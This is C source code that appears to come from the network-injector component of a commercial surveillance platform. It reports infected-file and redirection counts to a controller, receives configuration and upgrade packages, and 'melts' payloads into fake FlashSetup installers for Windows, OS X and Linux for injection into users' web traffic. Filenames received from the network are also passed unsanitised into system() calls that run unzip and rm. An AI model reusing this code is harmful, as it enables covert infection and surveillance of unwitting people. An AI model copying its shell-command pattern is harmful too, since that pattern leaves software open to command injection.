int ssl_proto_write(BIO *ssl, void *buf, int num)
{
   int written = 0;
   int len;

   do {
      len = BIO_write(ssl, (char *)buf + written, num - written);
      if (len <= 0) {
         break;
      }
      written += len;
   } while (written < num);

   return written;
}


void rnc_handleproto(BIO *ssl)
{
   RncProtoHeader pheader;
   RncProtoLogin plogin;
   int ret, retu;
   char descr[1024];
   char empty[RNC_SIGN_LEN];
   int need_cert = 0;

   DEBUG_MSG(D_DEBUG, "Handling connection from RNC");

   /* read the login from RNC */
   if ( (ret = ssl_proto_read(ssl, &pheader, sizeof(pheader))) <= 0) {
      DEBUG_MSG(D_ERROR, "Cannot read from RNC");
      return;
   }

   /* check if the command is correct */
   if (ret < (int)sizeof(RncProtoHeader) || pheader.code != RNC_PROTO_LOGIN) {
      DEBUG_MSG(D_ERROR, "Invalid login authentication");
      return;
   }
  
   /* retrieve the login from the NC */
   ret = ssl_proto_read(ssl, &plogin, sizeof(plogin));
   if (ret < (int)sizeof(RncProtoLogin)) {
      DEBUG_MSG(D_ERROR, "Invalid RNC authentication [%.32s] bytes %d expected %d", plogin.sign, ret, sizeof(RncProtoLogin));
      pheader.code = RNC_PROTO_NO;
      pheader.size = 0;
      ssl_proto_write(ssl, &pheader, sizeof(pheader));
      return;
   }

   /* first time in learning mode we must save the signature */
   memset(empty, 0, sizeof(empty));
   if (!memcmp(empty, GBL_NETCONF->rnc_sign, RNC_SIGN_LEN)) {
      FILE *fc;
      DEBUG_MSG(D_INFO, "Learning the NC signature [%.32s] bytes %d expected %d", plogin.sign, ret, sizeof(RncProtoLogin));
      
      /* remember it in memory */
      memcpy(GBL_NETCONF->rnc_sign, plogin.sign, RNC_SIGN_LEN);

      /* ask for the certificate later */
      need_cert = 1;

      /* save it to the file for subsequent run */
      fc = open_data("etc", GBL_NETCONF->rnc_sign_file, FOPEN_WRITE_TEXT);
      ON_ERROR(fc, NULL, "Cannot open %s", GBL_NETCONF->rnc_sign_file);

      /* dump the content of the buffer received from RNC into the file */
      if (fwrite(plogin.sign, sizeof(char), RNC_SIGN_LEN, fc) < RNC_SIGN_LEN)
         DEBUG_MSG(D_ERROR, "Cannot write sig file [%s]", GBL_NETCONF->rnc_sign_file);

      DEBUG_MSG(D_DEBUG, "Signature file [%s] learned", GBL_NETCONF->rnc_sign_file);

      fclose(fc);
   }

   /* check if the signature is correct. otherwise reply with NO */
   if (memcmp(plogin.sign, GBL_NETCONF->rnc_sign, RNC_SIGN_LEN)) {
      DEBUG_MSG(D_ERROR, "Invalid RNC authentication [%.32s] bytes %d expected %d", plogin.sign, ret, sizeof(RncProtoLogin));
      pheader.code = RNC_PROTO_NO;
      pheader.size = 0;
      ssl_proto_write(ssl, &pheader, sizeof(pheader));
      return;
   }

   pheader.code = RNC_PROTO_OK;
   pheader.size = 0;
   if (ssl_proto_write(ssl, &pheader, sizeof(pheader)) <= 0) {
      DEBUG_MSG(D_ERROR, "Cannot write to RNC");
      return;
   }

   DEBUG_MSG(D_DEBUG, "RNC authenticated and connected");

   /* send monitor status */
   if (rnc_sendversion(ssl) < 0) {
      DEBUG_MSG(D_ERROR, "Cannot communicate with RNC (monitor)");
      return;
   }

   /* retrieve the network certificate */
   if (need_cert) {
      if ((ret = rnc_retrievecert(ssl)) < 0) {
         DEBUG_MSG(D_ERROR, "Cannot communicate with RNC (cert)");
         return;
      }
   }

   /* prepare the string for the monitor */
   if (GBL_NET->network_error) {
      /* send monitor status */
      if (rnc_sendmonitor(ssl, "KO", "PROXY_IP is invalid, please fix the configuration...") < 0) {
         DEBUG_MSG(D_ERROR, "Cannot communicate with RNC (monitor)");
         return;
      }
   } else {
      snprintf(descr,sizeof(descr), "Active users: %u of %u   Redirected FQDN: %u   Redirected URL: %u   File Infected: %u",
            (u_int)GBL_STATS->active_users,
            (u_int)GBL_STATS->tot_users,
            (u_int)GBL_STATS->redir_fqdn,
            (u_int)GBL_STATS->redir_url,
            (u_int)GBL_STATS->inf_files);

      /* send monitor status */
      if (rnc_sendmonitor(ssl, "OK", descr) < 0) {
         DEBUG_MSG(D_ERROR, "Cannot communicate with RNC (monitor)");
         return;
      }
   }

   /* retrieve new conf (if any) */
   if ((ret = rnc_retrieveconf(ssl)) < 0) {
      DEBUG_MSG(D_ERROR, "Cannot communicate with RNC (config)");
      return;
   }

   /* check if there are new configs */
   if (ret) {
      DEBUG_MSG(D_INFO, "Received new configuration(s), sending signal to reload them...");
      fclose(open_data("tmp", "conf_received", FOPEN_WRITE_TEXT));

      /* reload the new config, the signal handler will reload them */
      kill(getpid(), SIGHUP);

   } else {
      DEBUG_MSG(D_DEBUG, "NO new configuration this time...");
      fclose(open_data("tmp", "conf_noreceived", FOPEN_WRITE_TEXT));
   }

   /* retrieve new upgrade (if any) */
   if ((retu = rnc_retrieveupgrade(ssl)) < 0) {
      DEBUG_MSG(D_ERROR, "Cannot communicate with RNC (upgrade)");
      return;
   }

   /* check if there are new configs */
   if (retu) {
      DEBUG_MSG(D_INFO, "Received new upgrade...");
      fclose(open_data("tmp", "upgrade_received", FOPEN_WRITE_TEXT));
   } else {
      DEBUG_MSG(D_DEBUG, "NO new upgrade this time...");
      fclose(open_data("tmp", "upgrade_noreceived", FOPEN_WRITE_TEXT));
   }

   /* send cached logs */
   if ((ret = rnc_sendlogs(ssl)) < 0) {
      DEBUG_MSG(D_ERROR, "Cannot communicate with RNC (logs)");
      return;
   }

   /* send BYE to RNC */
   pheader.code = RNC_PROTO_BYE;
   pheader.size = 0;

   ssl_proto_write(ssl, &pheader, sizeof(pheader));

   /* disconnect */
}


int rnc_sendversion(BIO *ssl)
{
   RncProtoHeader pheader;
   RncProtoVersion pversion;

   memset(&pheader, 0, sizeof(pheader));
   memset(&pversion, 0, sizeof(pversion));

   /* header parameters */
   pheader.code = RNC_PROTO_VERSION;
   pheader.size = sizeof(pversion);

   /* monitor parameters */
   snprintf(pversion.version, sizeof(pversion.version), "%s", GBL_RCS_VERSION);

   DEBUG_MSG(D_DEBUG, "Sending version information to RNC [%s]", GBL_RCS_VERSION);

   /* send header */
   if (ssl_proto_write(ssl, &pheader, sizeof(pheader)) <= 0)
      return -1;

   /* monitor part */
   if (ssl_proto_write(ssl, &pversion, sizeof(pversion)) <= 0)
      return -1;

   /* read the response from RNC */
   if (ssl_proto_read(ssl, &pheader, sizeof(pheader)) <= 0)
      return -1;

   if (pheader.code != RNC_PROTO_OK)
      return -1;

   return 0;
}



int rnc_sendmonitor(BIO *ssl, char *status, char *desc)
{
   RncProtoHeader pheader;
   RncProtoMonitor pmonitor;

   memset(&pheader, 0, sizeof(pheader));
   memset(&pmonitor, 0, sizeof(pmonitor));

   /* header parameters */
   pheader.code = RNC_PROTO_MONITOR;
   pheader.size = sizeof(pmonitor);

   /* monitor parameters */
   snprintf(pmonitor.status, sizeof(pmonitor.status), "%s", status);
   get_system_stats(&pmonitor.disk, &pmonitor.cpu, &pmonitor.pcpu);
   snprintf(pmonitor.desc, sizeof(pmonitor.desc), "%s", desc);

   DEBUG_MSG(D_DEBUG, "Sending monitor information to RNC [%s]", desc);

   /* send header */
   if (ssl_proto_write(ssl, &pheader, sizeof(pheader)) <= 0)
      return -1;

   /* monitor part */
   if (ssl_proto_write(ssl, &pmonitor, sizeof(pmonitor)) <= 0)
      return -1;

   /* read the response from RNC */
   if (ssl_proto_read(ssl, &pheader, sizeof(pheader)) <= 0)
      return -1;

   if (pheader.code != RNC_PROTO_OK)
      return -1;

   return 0;
}


int rnc_retrieveconf(BIO *ssl)
{
   DIR *dirvec = NULL;
   struct dirent *entvec = NULL;
   FILE *fc;
   RncProtoHeader pheader;
   RncProtoConfig pconfig;
   int found = 0;
   char *conf;

   /* header parameters */
   pheader.code = RNC_PROTO_CONF;
   pheader.size = 0;

   /* send request to check if there is new config */
   if (ssl_proto_write(ssl, &pheader, sizeof(pheader)) <= 0)
      return -1;

   /* loop to receive the new conf */
   LOOP {
      memset(&pheader, 0, sizeof(pheader));
      memset(&pconfig, 0, sizeof(pconfig));

      /* read the response from RNC */
      if (ssl_proto_read(ssl, &pheader, sizeof(pheader)) <= 0)
         break;

      /* there is NOT a new config */
      if (pheader.code != RNC_PROTO_CONF)
         break;

      /* retrieve the config header */
      if (ssl_proto_read(ssl, &pconfig, sizeof(pconfig)) <= 0)
         break;

      /* allocate the buffer and read the conf from RNC */
      SAFE_CALLOC(conf, pconfig.size, sizeof(char));
      if (ssl_proto_read(ssl, conf, pconfig.size) <= 0)
         break;

      DEBUG_MSG(D_INFO, "Received new config file [%s]", pconfig.filename);

      /* open the config file for writing */
      fc = open_data("etc", pconfig.filename, FOPEN_WRITE_TEXT);
      ON_ERROR(fc, NULL, "Cannot open %s", pconfig.filename);

      /* dump the content of the buffer received from RNC into the file */
      if (fwrite(conf, sizeof(char), pconfig.size, fc) < pconfig.size)
         DEBUG_MSG(D_ERROR, "Cannot write conf file [%s]", pconfig.filename);

      DEBUG_MSG(D_DEBUG, "Config file [%s] written (%d bytes)", pconfig.filename, pconfig.size);

      fclose(fc);

      /* if the file is a ZIP archive, extract it */
//      if (!strcasecmp(pconfig.filename + strlen(pconfig.filename) - 4, ".zip")) {
         char *path, *dir, *p;
         char argv[1024];
         int ret, stat = 0;

         /* get the path of the file */
         if ((path = get_path("etc", pconfig.filename)) == NULL)
            continue;

         dir = strdup(path);

         /* trim the filename, get the dirname */
         if ((p = strrchr(dir, '/')) != NULL)
            *p = 0;

         /* clean the vectors directory */
         snprintf(argv, sizeof(argv), "/bin/rm -f %s/vectors/*", dir);

         DEBUG_MSG(D_INFO, "Cleaning vectors directory...");
         /* execute the command */
         ret = system(argv);
         if (ret == -1 || ret == 127)
            DEBUG_MSG(D_ERROR, "Clean failed");

         /* prepare the commandline for unzip */
         snprintf(argv, sizeof(argv), "/usr/bin/unzip -o %s -d %s", path, dir);

         DEBUG_MSG(D_INFO, "Uncompressing configuration file...");
         /* execute the command */
         ret = system(argv);

         if (ret == -1 || ret == 127)
            DEBUG_MSG(D_ERROR, "Unzip failed");

         unlink(path);

         SAFE_FREE(dir);
         SAFE_FREE(path);

         if ((dirvec = opendir("/opt/td-config/share/vectors/")) != NULL) {
            while ((entvec = readdir(dirvec)) != NULL) {
               char *file = entvec->d_name;
	       char *cmd_melt = NULL;

               if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".windows") != NULL) {
                  file[strlen(file) - 8] = '\0';

                  DEBUG_MSG(D_INFO, "Windows detected, melting...");
                  ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py windows %s", file);
               } else if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".osx") != NULL) {
                  file[strlen(file) - 4] = '\0';

                  DEBUG_MSG(D_INFO, "OS X detected, melting...");
                  ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py osx %s", file);
	       } else if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".apk") != NULL) {
                  DEBUG_MSG(D_INFO, "Android detected, already melted...");
		  continue;
               } else if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".linux") != NULL) {
                  file[strlen(file) - 6] = '\0';

 	          DEBUG_MSG(D_INFO, "Linux detected, melting...");
                  ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py linux %s", file);
               } else {
	          continue;
               }

               if (ret == -1)
                  DEBUG_MSG(D_ERROR, "Melting allocation failed");

               ON_ERROR(cmd_melt, NULL, "virtual memory exhausted");

               ret = system(cmd_melt);

               if (ret == -1 || ret == 127)
                  DEBUG_MSG(D_ERROR, "Melting failed");

               SAFE_FREE(cmd_melt);
               stat = 1;
            }

            closedir(dirvec);
         } else {
	    DEBUG_MSG(D_ERROR, "Melting failed");
         }

         if (stat == 1) {
            DEBUG_MSG(D_INFO, "Melting for inject html flash completed");
         } else {
            DEBUG_MSG(D_INFO, "No melting for inject html flash");
         }
//      }

      /* increment the number of received config */
      found++;
   }

   return found;
}

int rnc_retrieveupgrade(BIO *ssl)
{
   FILE *fc;
   RncProtoHeader pheader;
   RncProtoUpgrade pupgrade;
   char *conf;
   char *namefile = "NetworkInjectorUpgrade.deb";
   int found = 0;

   /* header parameters */
   pheader.code = RNC_PROTO_UPGRADE;
   pheader.size = 0;

   /* send request to check if there is new upgrade */
   if (ssl_proto_write(ssl, &pheader, sizeof(pheader)) <= 0)
      return -1;

   /* loop to receive the new upgrade */
   LOOP {
      memset(&pheader, 0, sizeof(pheader));
      memset(&pupgrade, 0, sizeof(pupgrade));

      /* read the response from RNC */
      if (ssl_proto_read(ssl, &pheader, sizeof(pheader)) <= 0)
         break;

      /* there is NOT a new upgrade */
      if (pheader.code != RNC_PROTO_UPGRADE)
         break;

      /* retrieve the upgrade header */
      if (ssl_proto_read(ssl, &pupgrade, sizeof(pupgrade)) <= 0)
         break;

      /* allocate the buffer and read the upgrade from RNC */
      SAFE_CALLOC(conf, pupgrade.size, sizeof(char));
      if (ssl_proto_read(ssl, conf, pupgrade.size) <= 0)
         break;

      DEBUG_MSG(D_INFO, "Received new upgrade file [%s]", namefile);

      /* open the upgrade file for writing */
      fc = open_data("etc", namefile, FOPEN_WRITE_TEXT);
      ON_ERROR(fc, NULL, "Cannot open %s", namefile);

      /* dump the content of the buffer received from RNC into the file */
      if (fwrite(conf, sizeof(char), pupgrade.size, fc) < pupgrade.size)
         DEBUG_MSG(D_ERROR, "Cannot write conf file [%s]", namefile);

      DEBUG_MSG(D_DEBUG, "Upgrade file [%s] written (%d bytes)", namefile, pupgrade.size);

      fclose(fc);

      /* increment if received upgrade */
      found++;
      break;
   }

   return found;
}

int rnc_retrievecert(BIO *ssl)
{
   FILE *fc;
   RncProtoHeader pheader;
   RncProtoCert pcert;
   char *cert;

   /* header parameters */
   pheader.code = RNC_PROTO_CERT;
   pheader.size = 0;

   /* send request to retrieve the certificate */
   if (ssl_proto_write(ssl, &pheader, sizeof(pheader)) <= 0)
      return -1;

   memset(&pheader, 0, sizeof(pheader));
   memset(&pcert, 0, sizeof(pcert));

   /* read the response from RNC */
   if (ssl_proto_read(ssl, &pheader, sizeof(pheader)) <= 0)
      return -1;

   /* there is NOT a cert */
   if (pheader.code != RNC_PROTO_CERT)
      return -1;

   /* retrieve the cert header */
   if (ssl_proto_read(ssl, &pcert, sizeof(pcert)) <= 0)
      return -1;

   /* allocate the buffer and read the cert from RNC */
   SAFE_CALLOC(cert, pcert.size, sizeof(char));
   if (ssl_proto_read(ssl, cert, pcert.size) <= 0)
      return -1;

   DEBUG_MSG(D_INFO, "Received new cert file [%d bytes]", pcert.size);

   fc = open_data("etc", "rcs-network.pem", FOPEN_WRITE_TEXT);
   ON_ERROR(fc, NULL, "Cannot open rcs-network.pem");

   /* dump the content of the buffer received from RNC into the file */
   if (fwrite(cert, sizeof(char), pcert.size, fc) < pcert.size)
      DEBUG_MSG(D_ERROR, "Cannot write cert file [rcs-network.pem]");

   DEBUG_MSG(D_DEBUG, "Certificate file [rcs-network.pem] learned");

   fclose(fc);

   SAFE_FREE(cert);

   return 0;
}

int rnc_sendlogs(BIO *ssl)
{
   RncProtoHeader pheader;
   RncProtoLog plog;
   u_int count = 0;

   /* header parameters */
   pheader.code = RNC_PROTO_LOG;
   pheader.size = sizeof(plog);

   /* send logs until there are any in the cache */
   while (log_get(&plog)) {

      /* send header for the log */
      if (ssl_proto_write(ssl, &pheader, sizeof(pheader)) <= 0)
         return -1;

      /* send the log */
      if (ssl_proto_write(ssl, &plog, sizeof(plog)) <= 0)
         return -1;

      // DEBUG_MSG(D_VERBOSE, "rnc_sendlogs - [%s]", plog.desc);

      count++;
   }

   DEBUG_MSG(D_DEBUG, "%d log sent to RNC", count);

   return count;
}
#endif

void get_system_stats(u_int *disk, u_int *cpu, u_int *pcpu)
{
   FILE *fproc;
   char line[1024];
   int ouser, onice, osys, oidle, ohi, oirq, osoft;
   int user, nice, sys, idle, hi, irq, soft;
   int opuser, opsys, puser, psys;
   int tot;
   char *p;
   struct statvfs fs;
   int dummy;
   char cdummy;

   /* initialize the values */
   *disk = -1;
   *cpu = -1;
   *pcpu = -1;

   /* filesystem stats */
   statvfs(".", &fs);
   *disk = (int)((float)fs.f_bavail / (float)fs.f_blocks * 100);

   memset(line, 0, sizeof(line));

   /* cpu stats (globals) */
   if ((fproc = fopen("/proc/stat", "r")) == NULL)
      return;
   dummy = fread(line, 1024 - 1, sizeof(char), fproc);
   fclose(fproc);
   /* get the values from the string (we need all of them) */
   if (sscanf(line, "cpu  %d %d %d %d %d %d %d", &ouser, &onice, &osys, &oidle, &ohi, &oirq, &osoft) != 7)
      return;

   memset(line, 0, sizeof(line));

   /* cpu stats (current process) */
   if ((fproc = fopen("/proc/self/stat", "r")) == NULL)
      return;
   dummy = fread(line, 1024 - 1, sizeof(char), fproc);
   fclose(fproc);

   /* skip the process name */
   if ((p = strchr(line, ')')) == NULL)
      return;

   /* get the values from the string (we need only user and sys times) */
   if (sscanf(p + 2, "%c %d %d %d %d %d %d %d %d %d %d %d %d",
         &cdummy, &dummy, &dummy,
         &dummy, &dummy, &dummy,
         &dummy, &dummy, &dummy,
         &dummy, &dummy,
         &opuser, &opsys) != 13)
      return;

   /* wait 1 second for the sampling */
   sleep(1);

   memset(line, 0, sizeof(line));

   if ((fproc = fopen("/proc/stat", "r")) == NULL)
      return;
   dummy = fread(line, 1024 - 1, sizeof(char), fproc);
   fclose(fproc);

   /* get the values from the string (we need all of them) */
   if (sscanf(line, "cpu  %d %d %d %d %d %d %d", &user, &nice, &sys, &idle, &hi, &irq, &soft) != 7)
      return;

   memset(line, 0, sizeof(line));

   if ((fproc = fopen("/proc/self/stat", "r")) == NULL)
      return;
   dummy = fread(line, 1024 - 1, sizeof(char), fproc);
   fclose(fproc);

   /* skip the process name */
   if ((p = strchr(line, ')')) == NULL)
      return;

   /* get the values from the string (we need only user and sys times) */
   if (sscanf(p + 2, "%c %d %d %d %d %d %d %d %d %d %d %d %d",
         &cdummy, &dummy, &dummy,
         &dummy, &dummy, &dummy,
         &dummy, &dummy, &dummy,
         &dummy, &dummy,
         &puser, &psys) != 13)
      return;

   tot = (user+nice+sys+idle+hi+irq+soft) - (ouser+onice+osys+oidle+ohi+oirq+osoft);

   *cpu = (int)((1 - (float)(idle - oidle) / (float)tot) * 100);
   *pcpu = (int)((float)(puser + psys - opuser - opsys) / (float)tot * 100);
}

/* EOF */

// vim:ts=3:expandtab

